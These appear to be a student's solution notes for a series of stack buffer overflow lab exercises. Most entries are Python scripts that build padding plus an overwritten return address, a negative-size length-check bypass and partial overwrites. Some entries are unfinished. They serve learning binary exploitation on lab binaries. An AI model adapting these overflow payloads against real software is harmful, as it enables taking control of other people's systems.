## ex 1.0
Payload size: 25  
Insert 'a' x 25

## ex 1.1
Payload size: 100
Insert 'a' x 100

## ex 2.0
Payload size: 401
Insert 'a' x 401

## ex 2.1
Payload size: 1000
Insert 'a' x 1000

## ex 3.0
Payload size: 64  
Script python:
```
number = b"\x36\x34\x0a"
payload = b"\x90" * 56
payload += b"\x19\x20\x40\x00\x00\x00\x00\x00"
f = open("in.txt", "wb")
f.write(number + payload)
f.close()
```

## ex 3.1
Payload size: 112  
Script python:
```
number = b"\x31\x31\x32\x0a"
payload = b"\x90" * 104
payload += b"\x35\x1d\x40\x00\x00\x00\x00\x00"
f = open("in.txt", "wb")
f.write(number + payload)
f.close()
```

## ex 4.0
+ challenge is smart: it will check to make sure you
don't want to provide so much data that the input buffer will
overflow. Triggers with payload size > 60
Script python:
```
number = b"\x2d\x39\x36\x0a"                        # size = -96
payload = b"\x90" * 88
payload += b"\xa1\x18\x40\x00\x00\x00\x00\x00"
f = open("in.txt", "wb")
f.write(number + payload)
f.close()
```

## ex 4.1
+ triggers with payload size > 54
Script python:
```
number = b"\x2d\x39\x36\x0a"
payload = b"\x90" * 88
payload += b"\x76\x1a\x40\x00\x00\x00\x00\x00"
f = open("in.txt", "wb")
f.write(number + payload)
f.close()
```

## ex 5.0
+ this challenge will let you send multiple payload records concatenated together.
It will make sure that the total payload size fits in the allocated buffer
on the stack  
+ triggers with number of payloads > 7
+ triggers with number of payloads = 0 or payload size = 0
Script python:  
```
```  
???

## ex 5.1
???

## ex 6.0
+ this challenge's win function will check if the argument passed is 0x1337. We need to jump past the check  
Script python:  
```
number = b"\x31\x32\x38\x0a"
payload = b"\x90" * 120
payload += b"\x89\x16\x40\x00\x00\x00\x00\x00"
f = open("in.txt", "wb")
f.write(number + payload)
f.close()
```

# ex 6.1
Script python:  
```
number = b"\x36\x34\x0a"
payload = b"\x90" * 56
payload += b"\xba\x14\x40\x00\x00\x00\x00\x00"
f = open("in.txt", "wb")
f.write(number + payload)
f.close()
```

# ex 7.0
Script python:  
```
number = b"\x34\x32\x0a"
payload = b"\x90" * 40
payload += b"\xce\x47"              # most significant 4 bits of second byte are random
f = open("in.txt", "wb")
f.write(number + payload)
f.close()
```

## ex 7.1
Script python:  
```
number = b"\x31\x32\x32\x0a"
payload = b"\x90" * 120
payload += b"\xa4\x19"              # most significant 4 bits of second byte are random
f = open("in.txt", "wb")
f.write(number + payload)
f.close()
```

## ex 8.0
+ this challenge is careful about reading your input: it will allocate a correctly-sized temporary
buffer on the heap, and then copy the data over to the stack  
Script python:  
```
```